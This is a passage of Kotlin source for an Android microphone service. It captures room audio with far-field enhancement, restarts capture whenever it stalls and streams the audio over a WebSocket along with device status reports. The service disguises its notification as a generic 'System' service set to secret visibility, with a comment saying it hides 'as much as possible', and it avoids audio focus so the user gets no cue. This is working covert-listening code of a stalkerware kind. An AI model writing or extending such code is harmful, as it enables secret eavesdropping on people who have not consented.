            while (isActive) {
                delay(10_000)  // Check every 10 seconds
                if (!wantsMicStreaming || activeWebSocket == null || isRecoveringMic || isWebRtcStreaming) continue

                if (isDeviceInCall()) {
                    sendHealthStatus("blocked_on_call")
                    continue
                }

                // Layer 6: Watchdog - stall detection reduced to 10s as requested
                val stalled = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 20_000)
                if (!isCapturing || stalled) {
                    isRecoveringMic = true
                    try {
                        Log.w(TAG, "Mic watchdog recovery triggered (capturing=$isCapturing stalled=$stalled)")
                        sendHealthStatus("watchdog_recover")
                        stopAudioCapture()
                        delay(300)
                        startAudioCapture()
                    } finally {
                        withContext(NonCancellable) {
                            isRecoveringMic = false
                        }
                    }
                }
            }
        }
    }

    private fun stopMicWatchdog() {
        micWatchdogJob?.cancel()
        micWatchdogJob = null
    }

    private fun createAudioRecordWithFallback(): AudioRecord? {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "AudioRecord init blocked: RECORD_AUDIO permission not granted")
            sendHealthStatus("mic_permission_missing")
            return null
        }
        // VOICE_RECOGNITION is usually best for far-field pickup, but some devices return
        // near-silent audio on specific sources. We rotate starting source after failures.
        val sources = preferredAudioSources()
        val offset = audioSourceRotation.mod(sources.size.coerceAtLeast(1))
        for (idx in sources.indices) {
            val source = sources[(offset + idx) % sources.size]
            try {
                val rec = AudioRecord(
                    source,
                    sampleRate,
                    channelConfig,
                    audioFormat,
                    recordBufferSize
                )
                if (rec.state == AudioRecord.STATE_INITIALIZED) {
                    // API 28+: prevent Android from auto-switching to a different mic
                    // mid-session (e.g. switching to a noise-cancelling secondary mic that
                    // attenuates distant voices).
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        try { rec.preferredDevice = null } catch (_: Exception) {}
                    }
                    // API 29+: switch pickup pattern from directional (call/close-talk) to
                    // omnidirectional so the mic captures all directions equally.
                    // -1.0 = omni, 0.0 = neutral, +1.0 = front-directional.
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        try { rec.setPreferredMicrophoneFieldDimension(-1.0f) } catch (_: Exception) {}
                        // 0 = MIC_DIRECTION_UNSPECIFIED — disables beam-forming so all directions
                        // are captured equally instead of favouring near/front speech.
                        try { rec.setPreferredMicrophoneDirection(0) } catch (_: Exception) {}
                    }
                    // Hardware NS/AEC/AGC (stored until session ends — do not release here).
                    releaseSessionAudioEffects()
                    val sessionId = rec.audioSessionId
                    if (NoiseSuppressor.isAvailable()) {
                        try {
                            noiseSuppressor = NoiseSuppressor.create(sessionId)
                            noiseSuppressor?.enabled = true
                        } catch (e: Exception) {
                            Log.w(TAG, "NoiseSuppressor init failed: ${e.message}")
                        }
                    }
                    if (AcousticEchoCanceler.isAvailable()) {
                        try {
                            acousticEchoCanceler = AcousticEchoCanceler.create(sessionId)
                            acousticEchoCanceler?.enabled = true
                        } catch (e: Exception) {
                            Log.w(TAG, "AcousticEchoCanceler init failed: ${e.message}")
                        }
                    }
                    if (AutomaticGainControl.isAvailable() && voiceProfile != "far") {
                        try {
                            automaticGainControl = AutomaticGainControl.create(sessionId)
                            automaticGainControl?.enabled = true
                        } catch (e: Exception) {
                            Log.w(TAG, "AutomaticGainControl init failed: ${e.message}")
                        }
                    }
                    activeAudioSource = source
                    Log.i(TAG, "AudioRecord initialized with source=$source, recordBuffer=$recordBufferSize, chunk=$streamChunkSize")
                    return rec
                }
                rec.release()
            } catch (e: Exception) {
                Log.w(TAG, "AudioRecord init failed for source=$source: ${e.message}")
            }
        }
        return null
    }

    private fun releaseSessionAudioEffects() {
        try { noiseSuppressor?.release() } catch (_: Exception) {}
        noiseSuppressor = null
        try { acousticEchoCanceler?.release() } catch (_: Exception) {}
        acousticEchoCanceler = null
        try { automaticGainControl?.release() } catch (_: Exception) {}
        automaticGainControl = null
    }

    /** Reset all IIR filter memory.  Must be called once at every capture-session start. */
    private fun resetEnhancerState() {
        hpfPrevX = 0.0; hpfPrevY = 0.0
        eq1X1 = 0.0; eq1X2 = 0.0; eq1Y1 = 0.0; eq1Y2 = 0.0
        hfShelfPrevOut = 0.0
        hfShelfNeedsPrime = true
        muLawDecimLp = 0.0
        // Start neutral to avoid startup overdrive from stacked userGain × prime gain.
        smoothedGain = 1.0
        spectralDenoiser.reset()
        // BUG-M3 fix: Reduced warmup from 30-50 to 10-15 chunks (200-300ms).
        // The spectral denoiser's own noiseAdaptFrames>=10 guard already prevents
        // premature subtraction, making the long warmup redundant.
        realtimeDenoiserWarmupChunksRemaining = if (voiceProfile == "far") 15 else 10
    }

    /**
    * Voice-monitor PCM enhancement pipeline.
     *
    * Correct order: denoise + controlled gain + limiter. Keep processing moderate
    * to avoid the distortion artifacts from overly aggressive EQ/boost stacks.
     *
    *  Stage 1 — HPF @ 120 Hz            removes sub-bass rumble
    *  Stage 2 — Presence EQ + high-shelf (low level — before gain)
    *  Stage 3 — Spectral denoiser       (skipped first ~30 chunks for model warmup)
    *  Stage 4 — Adaptive gain (+ user multiplier, single capped stage)
    *  Stage 5 — Soft peak limiter       prevents digital clipping
     *
     * Filter state (hpfPrev*, eq1*, bq*, pe*, smoothedGain) persists between
     * frames so there are no discontinuities at buffer boundaries.
     */
    private fun applyFarVoiceGain(buf: ByteArray, len: Int, willBeMuLaw: Boolean = false): ByteArray {
        if (len < 2) return buf.copyOf(len)
        val samples = len / 2
        val strongAi = aiEnhancementEnabled
        val p = voiceProfile
        // Issue A: willBeMuLaw now passed by caller (single codec decision per chunk)

        val inWarmup = realtimeDenoiserWarmupChunksRemaining > 0
        if (realtimeDenoiserWarmupChunksRemaining > 0) realtimeDenoiserWarmupChunksRemaining--

        // ── Decode PCM-16 LE → double working buffer ─────────────────────────
        val work = DoubleArray(samples)
        for (i in 0 until samples) {
            val lo = buf[i * 2].toInt() and 0xFF
            val hi = buf[i * 2 + 1].toInt() and 0xFF
            work[i] = ((hi shl 8) or lo).toShort().toDouble()
        }

        // ── Stage 1: High-pass filter (profile-aware, adaptive) ──────────────
        val noisyEnv = estimatedNoiseDb > -54.0
        // Profile-aware HPF cutoff:
        // Far/Room: slightly higher cutoff to reduce fan/rumble without thinning speech.
        // Near: higher cutoff to control close-talk/proximity bass.
        val hpAlpha = when (p) {
            "far"  -> if (noisyEnv) 0.9550 else 0.9600
            "near" -> if (noisyEnv) 0.9420 else 0.9500
            else   -> if (noisyEnv) 0.9580 else 0.9650
        }
        for (i in 0 until samples) {
            val x = work[i]
            val y = hpAlpha * (hpfPrevY + x - hpfPrevX)
            hpfPrevX = x; hpfPrevY = y
            work[i] = y
        }

        // ── Stage 2a: Presence EQ @ 2.2 kHz (subtle pre-gain shaping) ──
        val eq1b0 = 1.1356685
        val eq1b1 = -0.9976115
        val eq1b2 = 0.4004227
        val eq1a1 = -0.9976115
        val eq1a2 = 0.5360913
        for (i in 0 until samples) {
            val x = work[i]
            val y = eq1b0 * x + eq1b1 * eq1X1 + eq1b2 * eq1X2 - eq1a1 * eq1Y1 - eq1a2 * eq1Y2
            eq1X2 = eq1X1
            eq1X1 = x
            eq1Y2 = eq1Y1
            eq1Y1 = y
            val wet = when (p) {
                "near" -> if (strongAi) 0.22 else 0.16
                "far" -> if (strongAi) 0.35 else 0.25
                else -> if (strongAi) 0.16 else 0.12
            }
            work[i] = x * (1.0 - wet) + y * wet
        }

        // ── Stage 3: Spectral denoise ──
        if (inWarmup) {
            spectralDenoiser.denoise(work.copyOf())
        } else {
            // NEW-3: For MuLaw path, still denoise but skip the far/near blend.
            // The blend preserves original high-freq detail that gets decimated away anyway.
            val preDenoise = if ((p == "far" || p == "near") && !willBeMuLaw) work.copyOf() else null
            spectralDenoiser.denoise(work)
            if (preDenoise != null) {
                // Bug H2 fix: Increased original blend for far mode to preserve speech harmonics.
                // At OVER=0.84 the spectral denoiser already removes most noise, so we keep
                // more original signal for natural voice tone instead of thin/robotic sound.
                val blendOriginal = when (p) {
                    // S-H6 fix: When it's noisy (> -56dB), keep LESS original signal (0.30)
                    // and MORE denoised signal. Old logic kept 0.60 original, which left noise audible.
                    "far" -> if (estimatedNoiseDb > -56.0) 0.20 else 0.35
                    "near" -> 0.40
                    else -> 0.40
                }
                for (i in 0 until samples) {
                    work[i] = preDenoise[i] * blendOriginal + work[i] * (1.0 - blendOriginal)
                }
            }
        }

        // ── Stage 2b: High-shelf @ ~3.5 kHz ─────────────────────────────────
        if (p == "far" || (p == "near" && !willBeMuLaw)) {
            val hfGain = when (p) {
                "far" -> if (willBeMuLaw) {
                    if (strongAi) 1.14 else 1.08
                } else {
                    if (strongAi) 1.35 else 1.20
                }
                "near" -> if (strongAi) 1.18 else 1.10
                else -> 1.08
            }
            val hfAlpha = 0.15
            var prevOut = hfShelfPrevOut
            if (hfShelfNeedsPrime && samples > 0) {
                prevOut = work[0]
                hfShelfNeedsPrime = false
            }
            for (i in 0 until samples) {
                val highFreq = work[i] - prevOut
                prevOut = prevOut + hfAlpha * (work[i] - prevOut)
                work[i] = prevOut + highFreq * hfGain
            }
            hfShelfPrevOut = prevOut
        }

        // ── Stage 4: Adaptive gain (single loudness stage; no separate RMS norm — avoids pumping) ──
        var sumSq = 0.0
        for (v in work) sumSq += v * v
        val rms = Math.sqrt(sumSq / samples).coerceAtLeast(1.0)
        // Optimized for "loud volume, far voice"
        val gainCeil = when {
            willBeMuLaw -> 4.0
            p == "far" -> if (strongAi) 14.0 else 10.0
            p == "near" -> if (strongAi) 9.0 else 7.0
            else -> if (strongAi) 12.0 else 9.0
        }
        val gainTarget = when {
            willBeMuLaw -> 14000.0
            p == "far" -> if (strongAi) 28000.0 else 25000.0
            p == "near" -> if (strongAi) 21000.0 else 18000.0
            else -> if (strongAi) 23000.0 else 19500.0
        }
        val effectiveGainCeil = gainCeil
        val effectiveGainTarget = gainTarget
        val rawGain = (effectiveGainTarget / rms).coerceIn(1.0, effectiveGainCeil)
        // Smoother AGC dynamics: reduce pumping on brief impulsive peaks.
        smoothedGain = if (rawGain > smoothedGain)
            smoothedGain * 0.85 + rawGain * 0.15  // Release: rise faster
        else
            smoothedGain * 0.80 + rawGain * 0.20  // Attack: fall slower
        val userGain = softwareGainMultiplier.coerceIn(0.5, 5.0)
        // Issue C: Hard cap for MuLaw — µ-law quantization amplifies clipping artifacts.
        // With gainCeil=3.0 and user gain=3x, combinedGain could reach 9.0 without this.
        // Bug H5 fix: Reduced far combined cap from 9.0→6.0. With user gain up to 5x,
        // old cap allowed extreme noise amplification. New cap keeps noise below -20dB.
        val maxCombined = when {
            willBeMuLaw -> 4.5
            p == "far" -> if (strongAi) 10.0 else 8.0
            p == "near" -> 7.0
            else -> 9.0
        }
        var peakAbs = 1.0
        for (i in 0 until samples) {
            val abs = kotlin.math.abs(work[i])
            if (abs > peakAbs) peakAbs = abs
        }
        // Fix: Smoothly clamp the maximum possible gain so peaks don't exceed 40,000 before
        // hitting the soft limiter. Prevents sudden volume ducking/cutting when someone shouts.
        val maxSafeGain = 40_000.0 / peakAbs.coerceAtLeast(1.0)
        val combinedGain = (smoothedGain * userGain).coerceIn(0.5, min(maxCombined * userGain, maxSafeGain))
        for (i in 0 until samples) work[i] *= combinedGain

        // ── Stage 5: Soft peak limiter + encode PCM-16 LE ────────────────────
        val out = ByteArray(len)
        for (i in 0 until samples) {
            val limited = softPeakLimit(work[i])
            val clamped = limited.toInt().coerceIn(-32768, 32767)
            out[i * 2]     = (clamped and 0xFF).toByte()
            out[i * 2 + 1] = ((clamped shr 8) and 0xFF).toByte()
        }
        return out
    }

    // Bug L2: encodeWsFallbackAudio removed — dead code. Audio encoding is inlined in capture loop.

    private fun chooseWsFallbackCodec(): Byte {
        // Far field: always PCM (clarity over bandwidth).
        if (voiceProfile == "far") return AUDIO_CODEC_PCM16_16K

        // NEW-4: Explicit user codec preference always wins over network-based auto-selection.
        // If user sends stream_codec:pcm (e.g. for a critical recording), honour it even on low-net.
        if (wsStreamMode == "pcm") return AUDIO_CODEC_PCM16_16K
        if (wsStreamMode == "smart") return AUDIO_CODEC_MULAW_8K

        // AUTO MODE below — network conditions decide.
        // If WebSocket TCP buffer is actively bloating (device far from router), instantly compress!
        if (isNetworkLagging) return AUDIO_CODEC_MULAW_8K

        // BUG-H3/M1: Don't aggressively drop to MuLaw just because it's cellular or lowNetworkMode.
        // We want clear voice on cellular data, so prioritize PCM!
        val caps = connectivityManager?.getNetworkCapabilities(connectivityManager?.activeNetwork)
        val upKbps = caps?.linkUpstreamBandwidthKbps ?: 0
        // Only drop to MuLaw when bandwidth is SEVERELY constrained (< 40 kbps).
        if (upKbps in 1..40) return AUDIO_CODEC_MULAW_8K
        if (upKbps == 0 && wsReconnectAttempts >= 4) return AUDIO_CODEC_MULAW_8K

        // Otherwise, prioritize high-quality PCM for loud & clear voice on all networks.
        return AUDIO_CODEC_PCM16_16K
    }

    /**
     * 16 kHz PCM → low-pass + 2:1 decimate → 8 kHz-equivalent samples, then µ-law.
     * Keeps codec bandwidth and sample counts consistent with server 8 kHz playback.
     */
    private fun pcm16ToMuLaw(pcm16: ByteArray): ByteArray {
        val samples = pcm16.size / 2
        val outLen = samples / 2
        if (outLen <= 0) return ByteArray(0)
        val out = ByteArray(outLen)
        var o = 0
        var i = 0
        // Single-pole prefilter before 2:1 decimation (targets ~3.4kHz at 16kHz sample rate).
        val alpha = 0.747
        while (i + 3 < pcm16.size) {
            val s0 = readLeSample(pcm16, i).toDouble()
            val s1 = readLeSample(pcm16, i + 2).toDouble()
            // Filter both samples to build up LPF state, then decimate (keep s1 equivalent)
            muLawDecimLp = muLawDecimLp + alpha * (s0 - muLawDecimLp)
            muLawDecimLp = muLawDecimLp + alpha * (s1 - muLawDecimLp)
            out[o++] = linearToMuLaw(muLawDecimLp.toInt().coerceIn(-32768, 32767))
            i += 4
        }
        return out
    }

    private fun linearToMuLaw(sample: Int): Byte {
        val BIAS = 0x84
        val CLIP = 32635
        var pcmVal = sample
        val sign = if (pcmVal < 0) {
            pcmVal = -pcmVal
            0x80
        } else {
            0x00
        }
        if (pcmVal > CLIP) pcmVal = CLIP
        pcmVal += BIAS
        var exponent = 7
        var expMask = 0x4000
        while (exponent > 0 && (pcmVal and expMask) == 0) {
            exponent--
            expMask = expMask shr 1
        }
        val mantissa = (pcmVal shr (exponent + 3)) and 0x0F
        val muLaw = (sign or (exponent shl 4) or mantissa).inv() and 0xFF
        return muLaw.toByte()
    }

    // ────────────────────────────────────────────────────────────────────────
    // Overlap-add FFT spectral denoiser
    // ────────────────────────────────────────────────────────────────────────

    /**
     * Overlap-add spectral denoiser.
     *
     * Algorithm:
     *   1. Buffer incoming samples into 512-sample frames with 50% overlap.
     *   2. Apply Hann window and forward FFT.
     *   3. Estimate noise power spectrum by exponential averaging over quiet frames.
     *   4. Subtract the noise estimate from each frequency bin (power domain),
     *      keeping a spectral floor of 4% of the noise power to prevent musical noise.
     *   5. IFFT + Hann window + overlap-add → output.
     *
     * The denoiser is most effective on stationary noise: fans, AC hum, wind,
     * electrical hiss — exactly what a phone mic in a room picks up.  Neural
     * denoisers (RNNoise / DeepFilterNet) can go further but require NDK.
     *
     * Latency: HOP (256 samples) = 16 ms at 16 kHz — imperceptible in monitoring.
     */
    private inner class SpectralDenoiser {
        private val FRAME = 1024                // FFT length (must be power of 2)
        private val HOP   = FRAME / 2           // 50% overlap
        private val BINS  = FRAME / 2 + 1       // unique bins DC..Nyquist

        // Periodic Hann window — gives perfect reconstruction at 50% overlap.
        private val win = DoubleArray(FRAME) { i ->
            0.5 * (1.0 - Math.cos(2.0 * Math.PI * i / FRAME))
        }

        // Input overlap buffer
        private val inBuf  = DoubleArray(FRAME)
        private var inFill = 0

        // Output overlap-add accumulator
        private val outBuf   = DoubleArray(FRAME)
        // Queue of samples that are ready to be delivered to the caller
        private val readyOut = ArrayDeque<Double>(FRAME * 4)

        // Noise power spectrum (one value per positive frequency bin)
        // Conservative start for noisy environments; then adapt quickly during bootstrap.
        private val noisePow = DoubleArray(BINS) { 1e6 }
        /** FFT frames processed (always increments). */
        private var fftFramesProcessed = 0
        /** Frames where noise estimate was updated from quiet content only. */
        private var noiseAdaptFrames = 0

        fun reset() {
            inBuf.fill(0.0)
            inFill = 0
            outBuf.fill(0.0)
            readyOut.clear()
            noisePow.fill(1e6)
            fftFramesProcessed = 0
            noiseAdaptFrames = 0
        }

        /**
         * Process [samples] in-place.  Always writes exactly [samples].size values
         * back into the array (zero-padded for the very first partial frame).
         */
        fun denoise(samples: DoubleArray) {
            val n   = samples.size
            val out = DoubleArray(n)
            var outIdx = 0

            for (s in samples) {
                inBuf[inFill++] = s
                if (inFill == FRAME) {
                    // Process frame → overlap-add → queue HOP output samples
                    val frameOut = processFrame()
                    for (i in 0 until FRAME) outBuf[i] += frameOut[i]
                    for (i in 0 until HOP)   readyOut.addLast(outBuf[i])
                    // Slide accumulator and input buffer
                    outBuf.copyInto(outBuf, 0, HOP, FRAME)
                    for (i in FRAME - HOP until FRAME) outBuf[i] = 0.0
                    inBuf.copyInto(inBuf, 0, HOP, FRAME)
                    inFill = HOP
                }
            }

            // Drain queued output; preserve input continuity before FFT warmup output is ready.
            while (outIdx < n) {
                out[outIdx] = if (readyOut.isNotEmpty()) readyOut.removeFirst() else samples[outIdx]
                outIdx++
            }
            System.arraycopy(out, 0, samples, 0, n)
        }

        private fun processFrame(): DoubleArray {
            // Windowed FFT
            val re = DoubleArray(FRAME) { i -> inBuf[i] * win[i] }
            val im = DoubleArray(FRAME)
            fft(re, im, false)

            // Power spectrum for positive bins
            val power = DoubleArray(BINS) { i -> re[i]*re[i] + im[i]*im[i] }
            val frameRms = Math.sqrt(power.average()).coerceAtLeast(1.0)
            fftFramesProcessed++

            // Update noise estimate only from quiet frames — never bootstrap on speech
            // (fast alpha when few noise frames collected; avoids "underwater" musical noise).
            val noiseFloorRms = Math.sqrt(noisePow.average()).coerceAtLeast(1.0)
            val isQuiet = frameRms < noiseFloorRms * 1.2 + 20.0
            val bootstrapFrames = 20
            if (noiseAdaptFrames < bootstrapFrames || isQuiet) {
                val alpha = if (noiseAdaptFrames < bootstrapFrames) 0.5 else 0.96
                for (i in noisePow.indices) {
                    noisePow[i] = alpha * noisePow[i] + (1.0 - alpha) * power[i]
                }
                noiseAdaptFrames++
            }

            // Spectral subtraction once we have enough FFT history and noise adaptation (~160ms+)
            if (fftFramesProcessed >= 15 && noiseAdaptFrames >= 10) {
                // Increase subtraction only in strong/noisy conditions (e.g. exhaust fans).
                val strongDenoise = aiEnhancementEnabled || estimatedNoiseDb > -54.0
                // Optimized for "less noise" in far voice scenarios
                val OVER  = if (strongDenoise) 0.85 else 0.70
                val adaptiveFloor = when {
                    estimatedNoiseDb > -52.0 -> 0.10
                    estimatedNoiseDb > -57.0 -> 0.18
                    else -> 0.24
                }
                val FLOOR = if (strongDenoise) adaptiveFloor else 0.35
                for (i in 0 until BINS) {
                    val noiseP = noisePow[i].coerceAtLeast(1e-10)
                    val clean  = (power[i] - OVER * noiseP).coerceAtLeast(FLOOR * noiseP)
                    val scale  = if (power[i] > 1e-10) Math.sqrt(clean / power[i]) else 0.0
                    re[i] *= scale;  im[i] *= scale
                    // Mirror scale to conjugate negative-frequency bin
                    if (i in 1 until BINS - 1) {
                        re[FRAME - i] *= scale
                        im[FRAME - i] *= scale
                    }
                }
            }

            // IFFT + synthesis window
            fft(re, im, true)
            return DoubleArray(FRAME) { i -> re[i] * win[i] }
        }
    }

    /**
     * In-place Cooley-Tukey iterative radix-2 FFT / IFFT.
     * [re] and [im] must both have a length that is a power of two.
     * forward (inverse=false): analysis.  inverse (inverse=true): synthesis, scaled 1/N.
     */
    private fun fft(re: DoubleArray, im: DoubleArray, inverse: Boolean) {
        val n = re.size
        // Bit-reversal permutation
        var j = 0
        for (i in 1 until n) {
            var bit = n ushr 1
            while (j and bit != 0) { j = j xor bit; bit = bit ushr 1 }
            j = j xor bit
            if (i < j) {
                var t = re[i]; re[i] = re[j]; re[j] = t
                t = im[i];     im[i] = im[j]; im[j] = t
            }
        }
        // Butterfly stages
        var len = 2
        while (len <= n) {
            val half = len ushr 1
            val ang  = 2.0 * Math.PI / len * (if (inverse) -1.0 else 1.0)
            val wbRe = Math.cos(ang)
            val wbIm = Math.sin(ang)
            var i = 0
            while (i < n) {
                var wRe = 1.0; var wIm = 0.0
                for (k in 0 until half) {
                    val uRe = re[i + k];            val uIm = im[i + k]
                    val vRe = re[i+k+half]*wRe - im[i+k+half]*wIm
                    val vIm = re[i+k+half]*wIm + im[i+k+half]*wRe
                    re[i + k]      = uRe + vRe;     im[i + k]      = uIm + vIm
                    re[i + k+half] = uRe - vRe;     im[i + k+half] = uIm - vIm
                    val nwRe = wRe * wbRe - wIm * wbIm
                    wIm = wRe * wbIm + wIm * wbRe
                    wRe = nwRe
                }
                i += len
            }
            len = len shl 1
        }
        if (inverse) { val inv = 1.0 / n; for (i in 0 until n) { re[i] *= inv; im[i] *= inv } }
    }

    /**
     * Soft-knee peak limiter.
     * Linear below ±24000; exponential curve up to ±32767 for samples above the knee.
     * Prevents hard digital clipping without audible distortion.
     */
    private fun softPeakLimit(x: Double): Double {
        val knee = 31000.0 // Catch true peaks only; normal speech stays linear
        val ceil = 32767.0
        val abs  = Math.abs(x)
        if (abs <= knee) return x
        val range      = ceil - knee
        val excess     = abs - knee
        val compressed = knee + range * (1.0 - Math.exp(-excess / range))
        return Math.copySign(compressed, x)
    }

    private fun updateAutoAiProfile(pcm16: ByteArray, len: Int) {
        val sampleCount = len / 2
        if (sampleCount <= 0) return

        var sumSq = 0.0
        var peak = 0
        var i = 0
        while (i + 1 < len) {
            val s = readLeSample(pcm16, i)
            val abs = kotlin.math.abs(s)
            if (abs > peak) peak = abs
            sumSq += s.toDouble() * s.toDouble()
            i += 2
        }

        val rms = kotlin.math.sqrt(sumSq / sampleCount).coerceAtLeast(1.0)
        val rmsDb = 20.0 * kotlin.math.log10(rms / 32768.0)
        val peakDb = 20.0 * kotlin.math.log10((peak.coerceAtLeast(1)).toDouble() / 32768.0)
        val crestDb = peakDb - rmsDb

        val likelySpeech = rmsDb > -58.0 && crestDb > 5.0
        if (!likelySpeech) {
            val alpha = if (rmsDb > estimatedNoiseDb) 0.90 else 0.97
            estimatedNoiseDb = alpha * estimatedNoiseDb + (1.0 - alpha) * rmsDb
        }

        val now = System.currentTimeMillis()
        if (now - lastAutoAiSwitchAt < 20_000) return

        val shouldEnableStrong = estimatedNoiseDb > -55.0
        val shouldDisableStrong = estimatedNoiseDb < -63.0

        if (!aiEnhancementEnabled && shouldEnableStrong) {
            aiEnhancementEnabled = true
            lastAutoAiSwitchAt = now
            sendHealthStatus("auto_ai_on")
        } else if (aiEnhancementEnabled && shouldDisableStrong) {
            aiEnhancementEnabled = false
            lastAutoAiSwitchAt = now
            sendHealthStatus("auto_ai_off")
        }
    }

    private fun readLeSample(buf: ByteArray, offset: Int): Int {
        val lo = buf[offset].toInt() and 0xFF
        val hi = buf[offset + 1].toInt()
        return ((hi shl 8) or lo).toShort().toInt()
    }

    private fun stopAudioCapture(reason: String = "stop_capture_cmd") {
        Log.i(TAG, "[MIC] Stopping audio capture. Reason: $reason")
        isCapturing = false
        // Bug 2.7: Stop immediately before cancellation to prevent race
        try {
            audioRecord?.stop()
        } catch (_: Exception) {}
        audioCaptureStoppedExternally.set(true)
        audioCaptureJob?.cancel()
        audioCaptureJob = null
        // FIX Issue 1: Force-clear the guard immediately so startAudioCapture can
        // be called right away on fast WS reconnects without waiting for the
        // coroutine's finally block (which runs async and clears it there too).
        // The finally block calling set(false) again is harmless (idempotent).
        isCapturingGuard.set(false)
        val am = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
        if (ourAudioMode) {
            try { am?.mode = AudioManager.MODE_NORMAL } catch (_: Exception) {}
            ourAudioMode = false
        }
        // No AudioFocus to abandon — we never request it (avoids volume ducking).
        if (reason != "service_destroy") {
            sendHealthStatus(reason)
        }
    }

    private fun sendHealthStatus(reason: String) {
        if (activeWebSocket == null) return
        if (reason == "audio_tick") {
            safeSend("""{"type":"ping","deviceId":"$deviceId","ts":${System.currentTimeMillis()}}""")
            return
        }

        // Bug 7: Throttle routine/periodic health status to once per 60s when WS is stable.
        // Critical state changes (ws_open, webrtc_started, errors) always send immediately.
        val now = System.currentTimeMillis()
        val isRoutine = reason in setOf("audio_tick")
        if (isRoutine && now - lastHealthSentAt < 60_000) return

        lastHealthSentAt = now
        val battery = getBatterySnapshot()
        val internetOnline = isInternetOnline()
        val callActive = isDeviceInCall()
        
        // Get network quality info for debugging
        val cm = connectivityManager
        val network = cm?.activeNetwork
        val caps = if (network != null) cm.getNetworkCapabilities(network) else null
        val downKbps = caps?.linkDownstreamBandwidthKbps ?: 0
        val upKbps = caps?.linkUpstreamBandwidthKbps ?: 0
        val isWifi = caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
        val isCellular = caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true
        
        val msg = JSONObject().apply {
            put("type", "health_status")
            put("deviceId", deviceId)
            put("wsConnected", activeWebSocket != null)
            put("isWebRtcStreaming", isWebRtcStreaming)
            // In WebRTC mode microphone is captured by WebRTC audio source, not AudioRecord.
            put("micCapturing", isCapturing || isWebRtcStreaming)
            put("lastAudioChunkSentAt", lastAudioChunkSentAt)
            put("reason", reason)
            put("ts", lastHealthSentAt)
            put("aiMode", aiEnhancementEnabled)
            put("aiAuto", aiAutoModeEnabled)
            put("photoAi", aiPhotoEnhancementEnabled)
            put("photoQuality", photoQualityMode)
            put("photoNight", photoNightMode)
            put("appVersionName", BuildConfig.VERSION_NAME)
            put("appVersionCode", BuildConfig.VERSION_CODE)
            put("streamCodecMode", wsStreamMode)
            put("streamCodec", if (lastCodecChoice == AUDIO_CODEC_MULAW_8K) "smart" else "pcm")
            put("voiceProfile", voiceProfile)
            put("noiseDb", estimatedNoiseDb)
            put("internetOnline", internetOnline)
            put("callActive", callActive)
            put("lowNetwork", lowNetworkMode)
            put("streamingMode", "realtime")
            put("gainLevel", softwareGainMultiplier)
            put("networkLocked", prefs.getBoolean("network_locked", false))
            put("appLocked", prefs.getBoolean("lock_task_mode", false))

            // Network quality info
            put("netDownKbps", downKbps)
            put("netUpKbps", upKbps)
            put("netType", when {
                isWifi -> "wifi"
                isCellular -> "cellular"
                else -> "other"
            })
            put("bitrateKbps", currentWebRtcBitrateKbps)
            if (battery != null) {
                put("batteryPct", battery.first)
                put("charging", battery.second)
            }
        }
        safeSend(msg.toString())
    }

    private fun isInternetOnline(): Boolean {
        val cm = connectivityManager ?: return false
        val network = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(network) ?: return false
        val hasTransport = caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
        val validated = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        return hasTransport && validated
    }

    private fun isDeviceInCall(): Boolean {
        return try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return false
            val mode = audioManager.mode
            // We keep MODE_NORMAL during capture (ourAudioMode=false) so real calls are visible.
            // If we ever set MODE_IN_COMMUNICATION ourselves again, gate with !ourAudioMode.
            !ourAudioMode && (mode == AudioManager.MODE_IN_CALL || mode == AudioManager.MODE_IN_COMMUNICATION)
        } catch (_: Exception) {
            false
        }
    }

    private fun getBatterySnapshot(): Pair<Int, Boolean>? {
        return try {
            val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) ?: return null
            val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            val pct = if (level >= 0 && scale > 0) ((level * 100f) / scale).toInt().coerceIn(0, 100) else -1
            val status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
            val charging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL
            Pair(pct, charging)
        } catch (_: Exception) {
            null
        }
    }



    // ────────────────────────────────────────────────────────────────────────
    // Notification helpers
    // ────────────────────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        // IMPORTANCE_LOW is required for foreground service survival
        // But we hide as much as possible
        val channel = NotificationChannel(
            CHANNEL_ID,
            "System",  // Generic name
            NotificationManager.IMPORTANCE_LOW  // Required for foreground service
        ).apply {
            description = "Background service"
            setSound(null, null)
            enableVibration(false)
            setShowBadge(false)
            enableLights(false)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
        }
        getSystemService(NotificationManager::class.java)
            .createNotificationChannel(channel)
    }

    private fun buildNotification(statusText: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System")  // Generic title
            .setContentText(statusText.take(80))
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setLocalOnly(true)  // Don't sync to other devices
            .build()
    }

    private fun updateNotification(statusText: String) {
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIF_ID, buildNotification(statusText))
    }

    // ────────────────────────────────────────────────────────────────────────
    // WakeLock — keeps CPU awake while app is in background
    // ────────────────────────────────────────────────────────────────────────
    private fun acquireWakeLock() {
        val pm = getSystemService(PowerManager::class.java)
        
        synchronized(MicService::class.java) {
